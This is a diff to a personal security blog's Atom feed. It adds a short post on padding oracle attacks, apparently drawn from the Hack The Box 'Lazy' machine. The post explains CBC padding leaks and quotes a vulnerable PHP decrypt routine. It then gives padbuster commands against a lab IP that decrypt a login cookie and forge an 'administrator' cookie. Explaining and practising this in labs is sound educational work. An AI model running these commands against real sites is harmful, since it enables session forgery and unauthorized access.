@@ -4,13 +4,83 @@
  <title>Gesko</title>
  <link href="/atom.xml" rel="self"/>
  <link href="/"/>
- <updated>2021-12-16T07:24:33+01:00</updated>
+ <updated>2021-12-16T07:30:31+01:00</updated>
  <id></id>
  <author>
    <name>gesko</name>
    <email>your-email@email.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Padding Oracle Attack</title>
+   <link href="/2021/12/16/padding-oracle-attack"/>
+   <updated>2021-12-16T00:00:00+01:00</updated>
+   <id>/2021/12/16/Padding-Oracle-Attack</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;Padding%20Oracle%20Attack/padding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).&lt;/p&gt;
+
+&lt;p&gt;This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// example file from HTB lazy&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decryptString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;mcrypt_get_iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MCRYPT_DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MCRYPT_DES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pkcs5_unpad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid padding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// really? you want to be hacked?&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// maybe let's replace that or&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// remove entirely?&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is also a type of CCA or Chosen Ciphertext Attack.&lt;/p&gt;
+
+&lt;h2 id=&quot;details-on-ciphertext-manipulation&quot;&gt;Details on ciphertext manipulation&lt;/h2&gt;
+&lt;p&gt;Go to “The Theory” part of this &lt;a href=&quot;https://pentesterlab.com/exercises/padding_oracle/course&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;detection&quot;&gt;Detection&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Try manipulating cookie values. See if webapp will error response such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invalid padding&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;500&lt;/code&gt;,&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Using padbuster&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# installation&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;padbuster
+
+&lt;span class=&quot;c&quot;&gt;# detection&lt;/span&gt;
+padbuster http://10.10.10.10/index.php &lt;span class=&quot;s2&quot;&gt;&quot;RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-encoding&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-cookies&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;login=RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# gets an admin cookie&lt;/span&gt;
+padbuster http://10.10.10.10/index.php &lt;span class=&quot;s2&quot;&gt;&quot;RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-encoding&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-cookies&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;login=RVJDQrwUdTRWJUVUeBKkEA==&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-plaintext&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user=administrator&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Using &lt;a href=&quot;https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack&quot;&gt;bit flippingattack&lt;/a&gt;. Here is another resource from &lt;a href=&quot;https://www.youtube.com/watch?v=3VxZNflJqsw&amp;amp;t=460s&quot;&gt;ippsec&lt;/a&gt; using Burp.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle&quot;&gt;Padding Oracle - HackTricks&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=3VxZNflJqsw&quot;&gt;HTB Lazy&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=aH4DENMN_O4&amp;amp;t=873s&quot;&gt;Mathematical Explanation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://robertheaton.com/2013/07/29/padding-oracle-attack/&quot;&gt;The Padding Oracle Attack&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Difference between font formats</title>
